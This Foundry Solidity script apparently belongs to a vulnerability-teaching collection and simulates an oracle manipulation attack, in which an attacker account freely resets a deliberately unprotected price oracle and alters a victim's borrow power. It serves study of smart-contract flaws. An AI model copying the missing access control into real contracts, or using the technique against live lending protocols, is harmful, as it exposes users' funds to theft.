// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "../src/vulnerabilities/OracleManipulation.sol";

contract OracleManipulationScript is Script {
    function run() external {
        vm.startBroadcast();

        OracleManipulation oracleSystem = new OracleManipulation();

        console2.log("=== Oracle Manipulation Simulation ===");
        console2.log("OracleManipulation deployed at:", address(oracleSystem));

        address victim = vm.addr(3);
        address attacker = vm.addr(4);

        vm.deal(victim, 2 ether);
        vm.deal(attacker, 1 ether);

        console2.log("Victim:", victim);
        console2.log("Attacker:", attacker);

        // Victim deposits collateral
        vm.prank(victim);
        oracleSystem.deposit{value: 1 ether}();

        uint256 initialPrice = oracleSystem.price();
        uint256 borrowPowerBefore = oracleSystem.borrowPower(victim);

        console2.log("Initial oracle price:", initialPrice);
        console2.log("Victim borrow power before manipulation:", borrowPowerBefore);

        // Attacker inflates price
        vm.prank(attacker);
        oracleSystem.updatePrice(5000);

        uint256 inflatedPrice = oracleSystem.price();
        uint256 borrowPowerAfterInflation = oracleSystem.borrowPower(victim);

        console2.log("Inflated oracle price:", inflatedPrice);
        console2.log("Victim borrow power after inflation:", borrowPowerAfterInflation);

        // Attacker crashes price
        vm.prank(attacker);
        oracleSystem.updatePrice(1);

        uint256 crashedPrice = oracleSystem.price();
        uint256 borrowPowerAfterCrash = oracleSystem.borrowPower(victim);

        console2.log("Crashed oracle price:", crashedPrice);
        console2.log("Victim borrow power after crash:", borrowPowerAfterCrash);

        console2.log("Observation: missing access control allows arbitrary oracle updates");
        console2.log("=== Simulation Complete ===");

        vm.stopBroadcast();
    }
}